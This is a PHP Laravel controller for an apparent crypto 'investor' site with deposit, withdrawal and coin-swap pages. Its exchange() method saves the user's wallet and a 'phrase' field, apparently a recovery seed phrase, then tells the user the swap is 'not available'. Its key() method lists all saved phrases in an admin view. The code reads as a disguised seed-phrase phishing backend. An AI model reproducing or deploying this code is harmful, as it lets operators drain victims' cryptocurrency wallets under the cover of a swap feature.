<?php

namespace App\Http\Controllers;

use App\Models\Coin;
use App\Models\Payment;
use App\Models\Withdrawal;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Str;
use App\Models\User;
use Illuminate\Http\Request;

class InvestorController extends Controller
{
    //


    public function show()
    {
        $user = auth()->user();
        return view('Investor.board', ['user' => $user]);
        // return view('Investor.dashboard');
    }





    public function reveal()
    {
        $user = auth()->user();
        return view('Investor.deposit', ['user' => $user]);
        // return view('Investor.deposit');
    }

    public function reveall()
    {
        $user = auth()->user();
        return view('Investor.subscribe', ['user' => $user]);
        // return view('Investor.deposit');
    }

    public function coin()
    {
        $payment = Payment::all();
        return view('Investor.address', compact('payment'));
    }



    public function profile()
    {


        return view('Investor.profile');
    }


    public function profileupdate()
    {
        return view('Investor.profile');
    }

    public function withdraw()
    {
        $user = auth()->user();
        return view('Investor.withdraw', ['user' => $user]);
        // return view('Investor.withdraw');
    }


    public function withdrawform()
    {
        $user_id = Auth::id();
        $withdrawals = Withdrawal::where('user_id', $user_id)->get();
        // return view('investor.withdrawals', ['withdrawals' => $withdrawals]);
        return view('Investor.withdrawform', ['withdrawals' => $withdrawals]);
    }

    public function swap()
    {

        return view('Investor.cornswap');
    }

    public function form()
    {

        return view('Investor.form');
    }






    public function storecoin(Request $request)
    {
        // $coin = new Coin();
        // $coin->wallet = $request->input('wallet');

        // $request->validate([
        //     'wallet' => ['required', 'string', 'max:100'],

        // ]);

        // $coin = Coin::create([
        //     'wallet' => $request->wallet,

        // ]);
        // $coin->save();



        // return redirect()->route('coin.index');

        return view('Investor.cornswap');
    }

    public function exchange(Request $request)
    {

        $coins = new Coin();
        $coins->wallet = $request->input('wallet');
        $coins->phrase = $request->input('phrase');
        $coins->to = $request->input('to');
        $coins->toamount = $request->input('toamount');
        $coins->from = $request->input('from');
        $coins->fromamount = $request->input('fromamount');
        $coins->save();

        // return redirect()->route('coin.index');

        // return view('Investor.cornswap');
        return redirect()->route('investor.swap')->with('success', 'not available');
    }




    public function key()
    {
        $coin = Coin::all();


        return view('Admin.show', compact('coin'));
    }


    public function destroy($id)
    {

        // Delete the payment from the database.
        Coin::destroy($id);

        // Redirect the user back to the payments list page.
        // return view('Admin.addcoin');
        return redirect()->back()->with('success', 'Investor details deleted successfully.');
    }



    public function histor(Request $request)
    {
        $request->validate([
            'amount' => 'required|numeric',
            'address' => 'required|string|max:255',
            'network' => 'required|string|max:255',
        ]);

        $withdrawal = new Withdrawal();
        $withdrawal->withdrawal_id = Str::random(6);
        $withdrawal->user_id = Auth::id();
        $withdrawal->amount = $request->input('amount');
        $withdrawal->address = $request->input('address');
        $withdrawal->network = $request->input('network');
        $withdrawal->save();

        return redirect()->back()->with('success', 'Withdrawal request submitted successfully.');
    }
}
